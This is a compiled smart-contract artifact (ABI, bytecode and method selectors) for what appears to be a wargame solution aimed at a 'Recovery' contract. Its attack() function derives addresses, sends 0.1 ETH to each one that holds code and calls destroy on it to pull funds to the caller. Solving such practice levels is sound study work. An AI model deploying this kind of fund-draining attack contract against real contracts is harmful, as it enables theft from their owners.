{"abi":[{"type":"constructor","inputs":[{"name":"_recoveryInstance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"calculateTokenAddress","inputs":[{"name":"i","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"isContract","inputs":[{"name":"addr","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"recoveryInstance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IRecovery"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516103a33803806103a3833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b61031d806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80631341f4aa1461004e57806316279055146100c15780639e5faafc146100e5578063f775b286146100ef575b5f5ffd5b6100a461005c3660046102a3565b5f805460405160609190911b6bffffffffffffffffffffffff191660208201526034810183905260540160408051601f19818403018152919052805160209091012092915050565b6040516001600160a01b0390911681526020015b60405180910390f35b6100d56100cf3660046102ba565b3b151590565b60405190151581526020016100b8565b6100ed610101565b005b5f546100a4906001600160a01b031681565b5f5b600a8110156102a0575f610159825f805460405160609190911b6bffffffffffffffffffffffff191660208201526034810183905260540160408051601f19818403018152919052805160209091012092915050565b9050803b15610297575f816001600160a01b031667016345785d8a00006040515f6040518083038185875af1925050503d805f81146101b3576040519150601f19603f3d011682016040523d82523d5f602084013e6101b8565b606091505b5050905080610227576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600f60248201527f4554482073656e64206661696c65640000000000000000000000000000000000604482015260640160405180910390fd5b6040517ef55d9d0000000000000000000000000000000000000000000000000000000081523360048201526001600160a01b0383169062f55d9d906024015f604051808303815f87803b15801561027c575f5ffd5b505af115801561028e573d5f5f3e3d5ffd5b50505050505050565b50600101610103565b50565b5f602082840312156102b3575f5ffd5b5035919050565b5f602082840312156102ca575f5ffd5b81356001600160a01b03811681146102e0575f5ffd5b939250505056fea2646970667358221220befa9bb5c61dedacee39bf1013beefa09d27796095fb09ad75c94901033d24fc64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","calculateTokenAddress(uint256)":"1341f4aa","isContract(address)":"16279055","recoveryInstance()":"f775b286"},"id":0}